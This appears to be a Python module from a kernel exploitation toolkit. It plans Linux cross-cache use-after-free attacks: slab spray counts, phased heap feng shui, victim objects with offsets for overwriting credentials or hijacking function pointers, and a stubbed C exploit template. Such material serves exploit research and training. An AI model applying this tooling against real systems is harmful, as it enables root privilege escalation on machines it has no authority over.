"""
Linux kernel cross-cache exploitation techniques.

Cross-cache attacks allow exploiting UAF vulnerabilities where the
vulnerable object and the target object are in different SLUB caches.

Key insight: When a slab is completely freed, its pages return to
the buddy allocator and can be reallocated to a different cache.

Techniques:
1. Page-level UAF: Free entire slab, reclaim with different cache
2. Slab merging: Some caches are merged (same size + flags)
3. GFP flag manipulation: Control allocation source

References:
- https://ruia-ruia.github.io/2022/08/05/CVE-2022-29582-io-uring/
- https://google.github.io/security-research/pocs/linux/
- https://blog.theori.io/research/CVE-2022-32250/
"""

import struct
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Any, Dict, List, Optional, Set, Tuple

from supwngo.utils.logging import get_logger

logger = get_logger(__name__)


class SlubCache(Enum):
    """Common SLUB caches for exploitation."""
    KMALLOC_32 = "kmalloc-32"
    KMALLOC_64 = "kmalloc-64"
    KMALLOC_96 = "kmalloc-96"
    KMALLOC_128 = "kmalloc-128"
    KMALLOC_192 = "kmalloc-192"
    KMALLOC_256 = "kmalloc-256"
    KMALLOC_512 = "kmalloc-512"
    KMALLOC_1K = "kmalloc-1k"
    KMALLOC_2K = "kmalloc-2k"
    KMALLOC_4K = "kmalloc-4k"
    KMALLOC_8K = "kmalloc-8k"

    # Dedicated caches
    CRED_JAR = "cred_jar"
    FILP = "filp"
    NAMES_CACHE = "names_cache"
    SEQ_FILE = "seq_file"
    MSG_MSG = "msg_msg"
    SK_BUFF = "skbuff_head_cache"


@dataclass
class SlubInfo:
    """Information about a SLUB cache."""
    name: str
    object_size: int
    slab_size: int  # Usually PAGE_SIZE or multiple
    objects_per_slab: int
    flags: int = 0
    ctor: bool = False  # Has constructor
    rcu: bool = False   # Uses RCU freeing

    @property
    def can_merge(self) -> bool:
        """Check if this cache can be merged with kmalloc."""
        # Caches with constructors or special flags don't merge
        return not self.ctor and not self.rcu


# Known cache information (approximate, varies by kernel version)
KNOWN_CACHES: Dict[str, SlubInfo] = {
    "kmalloc-64": SlubInfo("kmalloc-64", 64, 4096, 64),
    "kmalloc-128": SlubInfo("kmalloc-128", 128, 4096, 32),
    "kmalloc-256": SlubInfo("kmalloc-256", 256, 4096, 16),
    "kmalloc-512": SlubInfo("kmalloc-512", 512, 4096, 8),
    "kmalloc-1k": SlubInfo("kmalloc-1k", 1024, 4096, 4),
    "kmalloc-2k": SlubInfo("kmalloc-2k", 2048, 4096, 2),
    "kmalloc-4k": SlubInfo("kmalloc-4k", 4096, 4096, 1),
    "cred_jar": SlubInfo("cred_jar", 192, 4096, 21, ctor=True),
    "seq_file": SlubInfo("seq_file", 256, 4096, 16),
    "msg_msg": SlubInfo("msg_msg", 64, 4096, 64),  # Dynamic based on message
}


class CrossCacheAnalyzer:
    """
    Analyze cross-cache attack feasibility.

    Determines if vulnerable cache and target cache can
    share pages through the buddy allocator.
    """

    PAGE_SIZE = 4096

    def __init__(self):
        self.caches = KNOWN_CACHES.copy()

    def get_cache_info(self, cache_name: str) -> Optional[SlubInfo]:
        """Get information about a cache."""
        return self.caches.get(cache_name)

    def analyze_crossover(
        self,
        source_cache: str,
        target_cache: str,
    ) -> Dict[str, Any]:
        """
        Analyze if cross-cache attack is possible.

        Args:
            source_cache: Cache with vulnerable object
            target_cache: Cache we want to reclaim as

        Returns:
            Analysis results
        """
        source_info = self.get_cache_info(source_cache)
        target_info = self.get_cache_info(target_cache)

        if not source_info or not target_info:
            return {"feasible": False, "reason": "Unknown cache"}

        # Check if caches use same order pages
        source_order = self._page_order(source_info.slab_size)
        target_order = self._page_order(target_info.slab_size)

        same_order = source_order == target_order

        # Calculate objects needed to free entire slab
        objects_to_free = source_info.objects_per_slab

        return {
            "feasible": same_order,
            "source_cache": source_cache,
            "target_cache": target_cache,
            "source_objects_per_slab": source_info.objects_per_slab,
            "target_objects_per_slab": target_info.objects_per_slab,
            "page_order": source_order,
            "same_page_order": same_order,
            "objects_to_free": objects_to_free,
            "strategy": self._suggest_strategy(source_info, target_info),
        }

    def _page_order(self, size: int) -> int:
        """Calculate page order for allocation."""
        order = 0
        while (self.PAGE_SIZE << order) < size:
            order += 1
        return order

    def _suggest_strategy(
        self,
        source: SlubInfo,
        target: SlubInfo,
    ) -> List[str]:
        """Suggest cross-cache attack strategy."""
        steps = []

        # Calculate spray requirements
        steps.append(f"1. Spray {source.objects_per_slab + 1} objects in {source.name}")
        steps.append(f"   (Ensures at least one full slab)")

        steps.append(f"2. Free all {source.objects_per_slab} objects from one slab")
        steps.append(f"   (Pages return to buddy allocator)")

        steps.append(f"3. Spray {target.objects_per_slab} objects in {target.name}")
        steps.append(f"   (Reclaim freed pages)")

        steps.append(f"4. UAF now allows {source.name} -> {target.name} confusion")

        return steps


class CrossCacheSpray:
    """
    Orchestrate cross-cache heap spray.

    The goal is to:
    1. Fill a slab with controlled objects
    2. Free all objects from that slab
    3. Have another allocation type reclaim those pages
    """

    def __init__(self, analyzer: Optional[CrossCacheAnalyzer] = None):
        self.analyzer = analyzer or CrossCacheAnalyzer()
        self.spray_objects: Dict[str, List[int]] = {}

    def calculate_spray_count(
        self,
        cache_name: str,
        extra_slabs: int = 2,
    ) -> int:
        """
        Calculate number of objects to spray for reliable exploitation.

        Args:
            cache_name: Target cache
            extra_slabs: Extra slabs to allocate for reliability

        Returns:
            Number of objects to allocate
        """
        info = self.analyzer.get_cache_info(cache_name)
        if not info:
            logger.warning(f"Unknown cache {cache_name}, using default")
            return 128

        # Allocate enough to fill multiple slabs
        return info.objects_per_slab * (1 + extra_slabs)

    def plan_spray_sequence(
        self,
        vuln_cache: str,
        target_cache: str,
    ) -> Dict[str, Any]:
        """
        Plan the complete spray sequence.

        Args:
            vuln_cache: Cache where vulnerability exists
            target_cache: Cache we want to reclaim as

        Returns:
            Spray plan
        """
        analysis = self.analyzer.analyze_crossover(vuln_cache, target_cache)

        if not analysis["feasible"]:
            return {
                "success": False,
                "reason": "Cross-cache not feasible",
                "analysis": analysis,
            }

        vuln_info = self.analyzer.get_cache_info(vuln_cache)
        target_info = self.analyzer.get_cache_info(target_cache)

        return {
            "success": True,
            "phase1": {
                "name": "Heap Feng Shui",
                "cache": vuln_cache,
                "spray_count": self.calculate_spray_count(vuln_cache),
                "description": "Fill multiple slabs with vulnerable objects",
            },
            "phase2": {
                "name": "Trigger Vulnerability",
                "description": "Trigger UAF on target object",
            },
            "phase3": {
                "name": "Free Slab",
                "objects_to_free": vuln_info.objects_per_slab,
                "description": "Free all objects from one slab to release pages",
            },
            "phase4": {
                "name": "Reclaim Pages",
                "cache": target_cache,
                "spray_count": target_info.objects_per_slab,
                "description": "Spray target objects to reclaim freed pages",
            },
            "phase5": {
                "name": "Exploit",
                "description": "Use dangling pointer to access target objects",
            },
            "notes": analysis["strategy"],
        }


class CommonVictimObjects:
    """
    Common kernel objects useful as cross-cache targets.

    These objects have useful properties for privilege escalation:
    - cred: Contains uid/gid (priv esc via uid=0)
    - seq_operations: Function pointers (code exec)
    - msg_msg: Flexible size, can leak/write
    - file: Reference counting, VFS ops
    """

    TARGETS = {
        "cred": {
            "cache": "cred_jar",
            "size": 192,
            "useful_fields": {
                "uid": 0x04,
                "gid": 0x08,
                "euid": 0x14,
                "egid": 0x18,
            },
            "exploit": "Overwrite uid/euid to 0 for root",
        },
        "seq_operations": {
            "cache": "kmalloc-32",
            "size": 32,
            "useful_fields": {
                "start": 0x00,
                "stop": 0x08,
                "next": 0x10,
                "show": 0x18,
            },
            "exploit": "Hijack function pointers for code execution",
        },
        "tty_struct": {
            "cache": "kmalloc-1k",
            "size": 736,
            "useful_fields": {
                "ops": 0x18,
            },
            "exploit": "Hijack tty_operations for code execution",
        },
        "subprocess_info": {
            "cache": "kmalloc-128",
            "size": 96,
            "useful_fields": {
                "path": 0x00,
                "argv": 0x08,
            },
            "exploit": "Control command execution path",
        },
    }

    @classmethod
    def get_target_info(cls, name: str) -> Optional[Dict[str, Any]]:
        """Get information about a target object."""
        return cls.TARGETS.get(name)

    @classmethod
    def find_targets_for_cache(cls, cache: str) -> List[str]:
        """Find suitable targets for a given cache."""
        return [
            name for name, info in cls.TARGETS.items()
            if info["cache"] == cache
        ]


class CrossCacheExploit:
    """
    Complete cross-cache exploitation helper.

    Combines analysis, spraying, and exploitation primitives.
    """

    def __init__(self):
        self.analyzer = CrossCacheAnalyzer()
        self.spray = CrossCacheSpray(self.analyzer)

    def plan_exploit(
        self,
        vuln_cache: str,
        goal: str = "code_exec",
    ) -> Dict[str, Any]:
        """
        Plan complete cross-cache exploit.

        Args:
            vuln_cache: Cache where vulnerability exists
            goal: "code_exec" or "priv_esc"

        Returns:
            Exploit plan
        """
        # Find suitable target based on goal
        if goal == "code_exec":
            candidates = ["seq_operations", "tty_struct"]
        else:
            candidates = ["cred"]

        # Find compatible target
        for candidate in candidates:
            target_info = CommonVictimObjects.get_target_info(candidate)
            if not target_info:
                continue

            target_cache = target_info["cache"]
            analysis = self.analyzer.analyze_crossover(vuln_cache, target_cache)

            if analysis["feasible"]:
                return {
                    "success": True,
                    "target_object": candidate,
                    "target_cache": target_cache,
                    "spray_plan": self.spray.plan_spray_sequence(
                        vuln_cache, target_cache
                    ),
                    "target_info": target_info,
                    "analysis": analysis,
                }

        return {
            "success": False,
            "reason": f"No suitable target found for {vuln_cache}",
            "vuln_cache": vuln_cache,
        }

    def generate_exploit_template(
        self,
        vuln_cache: str,
        target: str,
    ) -> str:
        """Generate C exploit template."""
        target_info = CommonVictimObjects.get_target_info(target)
        vuln_info = self.analyzer.get_cache_info(vuln_cache)

        return f'''
/*
 * Cross-cache exploitation template
 * Vulnerable cache: {vuln_cache}
 * Target: {target}
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/msg.h>

#define SPRAY_COUNT {vuln_info.objects_per_slab * 3 if vuln_info else 128}
#define TARGET_SPRAY {target_info["size"] if target_info else 64}

// Spray functions depend on target
// For seq_operations: open /proc/self/stat
// For cred: fork() processes
// For msg_msg: msgget/msgsnd

int msg_qids[SPRAY_COUNT];

void spray_vulnerable_cache(void) {{
    printf("[*] Phase 1: Spraying {vuln_cache}...\\n");

    // Spray with msg_msg for flexibility
    for (int i = 0; i < SPRAY_COUNT; i++) {{
        msg_qids[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
        // Send message sized for {vuln_cache}
    }}
}}

void trigger_vulnerability(int target_idx) {{
    printf("[*] Phase 2: Triggering vulnerability...\\n");
    // Trigger UAF on msg_qids[target_idx]
}}

void free_slab(int start_idx) {{
    printf("[*] Phase 3: Freeing slab...\\n");
    // Free all objects from one slab
    for (int i = start_idx; i < start_idx + {vuln_info.objects_per_slab if vuln_info else 32}; i++) {{
        // Free object
    }}
}}

void reclaim_as_target(void) {{
    printf("[*] Phase 4: Reclaiming as {target}...\\n");
    // Spray {target} objects to reclaim pages
}}

void exploit(void) {{
    printf("[*] Phase 5: Exploiting cross-cache confusion...\\n");
    // Use dangling pointer to corrupt {target}
}}

int main(void) {{
    printf("[*] Cross-cache attack: {vuln_cache} -> {target}\\n");

    spray_vulnerable_cache();
    trigger_vulnerability(SPRAY_COUNT / 2);
    free_slab(SPRAY_COUNT / 2);
    reclaim_as_target();
    exploit();

    return 0;
}}
'''
